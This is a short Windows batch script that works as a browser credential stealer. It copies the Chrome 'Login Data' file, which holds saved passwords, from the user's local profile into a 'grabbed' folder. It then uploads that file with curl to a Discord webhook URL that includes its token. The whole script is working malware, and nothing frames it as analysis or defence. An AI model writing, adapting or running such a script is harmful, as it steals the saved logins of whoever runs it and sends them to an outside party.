@echo off
setlocal

REM Ensure the 'grabbed' directory exists
if not exist "grabbed" mkdir grabbed

REM Copy the file
copy "%localappdata%\Google\Chrome\User Data\Default\Login Data" grabbed\data

REM Upload the file via curl
curl -F "file=@grabbed\data" https://discord.com/api/webhooks/1494325878765785230/kNQjLcC2B7dtNvT-sYob0EiAiUczz3-56_ep6kJOAmYpwjSVcR3rBx1i9Rfa6OY1OTm3

endlocal